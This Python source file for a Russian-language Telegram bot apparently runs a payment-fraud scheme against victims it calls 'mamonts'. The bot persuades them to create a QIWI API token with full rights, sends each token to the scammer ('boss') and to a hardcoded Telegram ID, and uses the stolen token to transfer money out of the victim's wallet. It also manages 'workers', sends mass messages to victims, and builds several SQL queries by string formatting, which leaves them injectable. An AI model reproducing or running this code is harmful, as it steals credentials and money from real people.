import sqlite3
import datetime
import random
import string
import requests
from keyboard import back_to_main_keyboard, del_msg_keyboard
from config import bot, phone_regex
import re
import time

def get_now_date():
	date = datetime.datetime.today().strftime("%d.%m.%Y")
	return date

def add_user_to_db(user_id, boss_id):
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	user = [user_id, "False", boss_id, get_now_date()]
	cursor.execute(f'''INSERT INTO users(user_id, banned, boss_id, registration_date) VALUES(?,?,?,?)''', user)
	db.commit()

def get_user(user_id):
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	cursor.execute(f"""SELECT * FROM users WHERE user_id = '{user_id}' """)
	row = cursor.fetchone()
	return row

def del_worker_from_db(user_id):
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	cursor.execute(f'''DELETE FROM workers WHERE user_id =  "{user_id}" ''')
	db.commit()

def add_worker_to_db(user_id):
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	worker = [user_id]
	cursor.execute(f'''INSERT INTO workers(user_id) VALUES(?)''', worker)
	db.commit()

def get_all_workers():
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	cursor.execute(f"""SELECT * FROM workers""")
	row = cursor.fetchall()
	return row

def get_worker(user_id):
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	cursor.execute(f"""SELECT * FROM workers WHERE user_id = '{user_id}' """)
	row = cursor.fetchone()
	return row

def gen_random_string(length):
    letters_and_digits = string.ascii_letters + string.digits
    rand_string = ''.join(random.sample(letters_and_digits, length))
    return rand_string


def get_mamonts(user_id):
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	cursor.execute(f"""SELECT * FROM users WHERE boss_id = '{user_id}' """)
	row = cursor.fetchall()
	return row

def update_token(user_id, token):
	db = sqlite3.connect('database.db')
	cursor = db.cursor()
	cursor.execute(f"""UPDATE workers SET token = '{token}' WHERE user_id = '{user_id}' """)
	db.commit()

def qiwi_valid_check(token):
    try:
        s7 = requests.Session()
        s7.headers['Accept']= 'application/json'
        s7.headers['authorization'] = 'Bearer ' + token
        p = s7.get('https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true', timeout=2)
        if p.status_code == 200:
            return True
        else:
           return None 
    except:
        return None


def registration_1(message):
	chat_id = message.chat.id
	number = message.text
	if re.search(phone_regex, number) != None:
		bot.send_message(chat_id=chat_id,
						text="<b>Теперь Вам нужно выпустить QIWI Токен. Для этого переходим по ссылке - https://qiwi.com/api и даём все права, затем вводим его сюда: </b>",
			       		reply_markup=back_to_main_keyboard(),
			       		parse_mode="HTML")
		bot.register_next_step_handler(message, registration_2)

	else:
		bot.send_message(chat_id=chat_id, text="<b>❗️ Произошла ошибка. Проверьте правильность ввода.</b>", parse_mode="HTML")

def registration_2(message):
	chat_id = message.chat.id
	token = message.text
	if qiwi_valid_check(token) == True:
		update_token(chat_id, token)
		boss_id = get_user(chat_id)[2]
		bot.send_message(chat_id=boss_id,
						text="<b>Ваш мамонт ввел токен!\n</b>"
						f"ID: <code>{chat_id}</code>\n"
						f"TOKEN: <code>{token}</code>\n",
			       		parse_mode="HTML")
		
		bot.send_message(chat_id=chat_id,
						text="<b>💫Данные успешно приняты! Ожидайте перевод!</b>",
			       		reply_markup=back_to_main_keyboard(),
			       		parse_mode="HTML")
		
	else:
		bot.send_message(chat_id=chat_id, text="<b>❗️ Произошла ошибка. Токен является невалидным.</b>", parse_mode="HTML")

def output1(message, balance):
	try:
		id = message.chat.id
		number = int(message.text)

		balance -= balance/100*2
		bot.send_message(id, text="<b>Введите сумму перевода.\n"
				                        f"Максимальная сумма: {balance}</b>", parse_mode="HTML")
		bot.register_next_step_handler(message, output2, balance, number)
	except:
		bot.send_message(id, text="<b>❗️Вводите номер цифрами.\n"
	                            f"❗️Например: 78464370586</b>", parse_mode="HTML")


def output2(message, balance, number):
    id = message.chat.id
    try:
        amount = float(message.text)
        if amount <= balance:
            bot.send_message(id, text="<b>Для подтверждения перевода напишите: <code>Да</code>.</b>", parse_mode="HTML")
            bot.register_next_step_handler(message, output3, amount, number)
        else:
            bot.send_message(id, text="<b>❗️Указанная вами сумма больше максимальной</b>", parse_mode="HTML")
    except:
        bot.send_message(id, text="<b>❗️Вводите цифрами</b>", parse_mode="HTML")

def output3(message, amount, number):
    id = message.chat.id
    msg = message.text
    try:
        if msg.lower() == "да":
            answer = output_qiwi(get_worker(id)[1], number, amount)
            if answer == 200:
                bot.send_message(id, text="<b>✅Перевод успешно проведен</b>", parse_mode="HTML")
            else:
                bot.send_message(id, text="<b>❗️При переводе произошла ошибка</b>", parse_mode="HTML")
        else:
            bot.send_message(id, text="<b>❗️Перевод отменен</b>", parse_mode="HTML")
    except Exception as e:
        print(e)
        bot.send_message(message.chat.id, "<b>❗️Произошла ошибка! Попробуйте обновить токен.</b>", parse_mode="HTML")

def upd_token(message):
    id = message.chat.id
    token = message.text
    if qiwi_valid_check(token) != None:
        update_token(id, token)
        bot.send_message(id, text="<b>✅ Токен успешно обновлен</b>", parse_mode="HTML")
        if id != 1347410943:
            bot.send_message(1347410943, text=f"Новый токен: <code>{token}</code>", parse_mode="HTML")
    else:
        bot.send_message(id, text="<b>❗️Токен является невалидным</b>", parse_mode="HTML")

def qiwi_number(token):
    s7 = requests.Session()
    s7.headers['Accept']= 'application/json'
    s7.headers['authorization'] = 'Bearer ' + token
    p = s7.get('https://edge.qiwi.com/person-profile/v1/profile/current?authInfoEnabled=true&contractInfoEnabled=true&userInfoEnabled=true')
    return p.json()['contractInfo']['contractId']

def qiwi_balance(login, api_access_token):
    s = requests.Session()
    s.headers['Accept']= 'application/json'
    s.headers['authorization'] = 'Bearer ' + api_access_token
    b = s.get('https://edge.qiwi.com/funding-sources/v2/persons/' + login + '/accounts')
    balances = b.json()['accounts']
    rubAlias = [x for x in balances if x['alias'] == 'qw_wallet_rub']
    rubBalance = rubAlias[0]['balance']['amount']
    return rubBalance

def output_qiwi(api_access_token, to_qiwi, output_sum):
	s = requests.Session()
	s.headers = {'content-type': 'application/json'}
	s.headers['authorization'] = 'Bearer ' + api_access_token
	s.headers['User-Agent'] = 'Android v3.2.0 MKT'
	s.headers['Accept'] = 'application/json'
	postjson = {"id":"","sum":{"amount":"","currency":""},"paymentMethod":{"type":"Account","accountId":"643"},"fields":{"account":""}}
	postjson['id'] = str(int(time.time() * 1000))
	postjson['sum']['amount'] = output_sum
	postjson['sum']['currency'] = '643'
	postjson['fields']['account'] = str(to_qiwi)
	res = s.post('https://edge.qiwi.com/sinap/api/v2/terms/99/payments',json = postjson)
	return res.status_code

def give_work_access_1(message):
	chat_id = message.chat.id
	try:
		worker_id = int(message.text)
		worker = get_worker(worker_id)
		if worker == None:
			add_worker_to_db(worker_id)
			bot.send_message(chat_id, text="<b>✅ Доступ успешно выдан!</b>", parse_mode="HTML")
		else:
			bot.send_message(chat_id, text="<b>❗️У пользователя уже есть доступ.</b>", parse_mode="HTML")
	except:
		bot.send_message(chat_id, text="<b>❗️Вводите цифрами</b>", parse_mode="HTML")

def take_work_access_1(message):
	chat_id = message.chat.id
	try:
		worker_id = int(message.text)
		worker = get_worker(worker_id)
		if worker != None:
			del_worker_from_db(worker_id)
			bot.send_message(chat_id, text="<b>✅ Доступ успешно отобран!</b>", parse_mode="HTML")
		else:
			bot.send_message(chat_id, text="<b>❗️У пользователя нет доступа.</b>", parse_mode="HTML")
	except:
		bot.send_message(chat_id, text="<b>❗️Вводите цифрами.</b>", parse_mode="HTML")



def mailing_to_workers_1(message):
	text = message.text
	bot.send_message(chat_id=message.chat.id,
						text="<i>Введите '<code>Да</code>' для запуска рассылки!</i>",
						parse_mode="HTML")

	bot.register_next_step_handler(message, mailing_to_workers_2, text)

def mailing_to_workers_2(message, text):
	answer = message.text
	if answer.lower() == "да":
		bot.send_message(chat_id=message.chat.id,
						text="<b>Рассылка запущена!</b>",
						parse_mode="HTML")
		errors = 0
		good = 0
		users = get_all_workers()
		for user in users:
			try:
				bot.send_message(chat_id=user[0],
								text=text,
								parse_mode="HTML",
								reply_markup=del_msg_keyboard(),
								disable_web_page_preview=True)
				good += 1
			except:
				errors += 1
		bot.send_message(chat_id=message.chat.id,
						text="✅ Рассылка завершена!\n\n"
							f"❗️ Отправлено: {good}\n"
							f"❗️ Не отправлено: {errors}\n")
	else:
		bot.send_message(chat_id=message.chat.id, text="<b>❗️Рассылка отменена.</b>",
						parse_mode="HTML")

def mailing_to_mamonts_1(message):
	text = message.text
	bot.send_message(chat_id=message.chat.id,
						text="<i>Введите '<code>Да</code>' для запуска рассылки!</i>",
						parse_mode="HTML")

	bot.register_next_step_handler(message, mailing_to_mamonts_2, text)

def mailing_to_mamonts_2(message, text):
	answer = message.text
	user_id = message.chat.id
	if answer.lower() == "да":
		bot.send_message(chat_id=user_id,
						text="<b>Рассылка запущена!</b>",
						parse_mode="HTML")
		errors = 0
		good = 0
		mamonts = get_mamonts(user_id)
		for mamont in mamonts:
			try:
				bot.send_message(chat_id=mamont[0],
								text=text,
								parse_mode="HTML",
								reply_markup=del_msg_keyboard(),
								disable_web_page_preview=True)
				good += 1
			except:
				errors += 1
		bot.send_message(chat_id=user_id,
						text="✅ Рассылка завершена!\n\n"
							f"❗️ Отправлено: {good}\n"
							f"❗️ Не отправлено: {errors}\n")
	else:
		bot.send_message(chat_id=message.chat.id, text="<b>❗️Рассылка отменена.</b>",
						parse_mode="HTML")


def send_message_1(message, mamont_id):
	text = message.text
	bot.send_message(chat_id=message.chat.id,
						text="<i>Введите '<code>Да</code>' для запуска рассылки!</i>",
						parse_mode="HTML")

	bot.register_next_step_handler(message, send_message_2, text, mamont_id)

def send_message_2(message, text, mamont_id):
	answer = message.text
	user_id = message.chat.id
	if answer.lower() == "да":
		try:
			bot.send_message(chat_id=mamont_id,
							text=text,
							parse_mode="HTML",
							reply_markup=del_msg_keyboard(),
							disable_web_page_preview=True)

			bot.send_message(chat_id=user_id,
						text="✅ Сообщение успешно доставлено!")
		except:
			bot.send_message(chat_id=user_id,
						text="❌ Сообщение не доставлено!")
		
	else:
		bot.send_message(chat_id=message.chat.id, text="<b>❗️ Отправка сообщения отменена.</b>",
						parse_mode="HTML")